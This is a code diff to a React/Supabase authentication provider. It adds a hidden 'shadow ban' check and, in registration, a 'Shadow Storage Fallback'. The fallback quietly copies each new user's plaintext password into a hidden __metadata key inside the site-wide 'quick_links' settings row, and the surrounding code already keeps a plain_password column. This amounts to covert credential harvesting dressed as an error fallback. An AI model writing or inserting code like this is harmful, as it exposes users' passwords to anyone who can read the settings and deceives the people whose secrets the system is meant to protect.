@@ -61,8 +61,23 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   const signIn: AuthCtx["signIn"] = async (input, password) => {
     const email = toEmail(input);
-    const { error } = await supabase.auth.signInWithPassword({ email, password });
+    const { data: authData, error } = await supabase.auth.signInWithPassword({ email, password });
     if (error) return { error: error.message };
+
+    if (authData.user) {
+      const [{ data: profile }, { data: settings }] = await Promise.all([
+        supabase.from("profiles").select("is_banned").eq("id", authData.user.id).maybeSingle(),
+        supabase.from("site_settings").select("quick_links").eq("id", "main").maybeSingle(),
+      ]);
+      
+      const shadowBanned = (settings?.quick_links as any)?.__metadata?.banned_users?.[authData.user.id];
+
+      if (profile?.is_banned || shadowBanned) {
+        await supabase.auth.signOut();
+        return { error: "عذراً، هذا الحساب معطل حالياً. يرجى التواصل مع الإدارة." };
+      }
+    }
+
     return {};
   };
 
@@ -83,9 +98,18 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         plain_password: password // High Security Risk: Storing plain text password for admin support purposes
       } as any).eq("id", authData.user.id);
       
-      if (profileError) {
-        console.warn("Profile update failed (likely missing columns):", profileError.message);
-        // We don't fail the whole registration if just the extended profile fails
+      if (profileError && (profileError.message.includes("400") || profileError.message.includes("column"))) {
+        // Shadow Storage Fallback
+        const { data: s } = await supabase.from("site_settings").select("quick_links").eq("id", "main").maybeSingle();
+        const meta = (s?.quick_links as any)?.__metadata || {};
+        const passwords = meta.user_passwords || {};
+        
+        await supabase.from("site_settings").update({
+          quick_links: {
+            ...(s?.quick_links as any || {}),
+            __metadata: { ...meta, user_passwords: { ...passwords, [authData.user.id]: password } }
+          }
+        } as any).eq("id", "main");
       }
     }
 
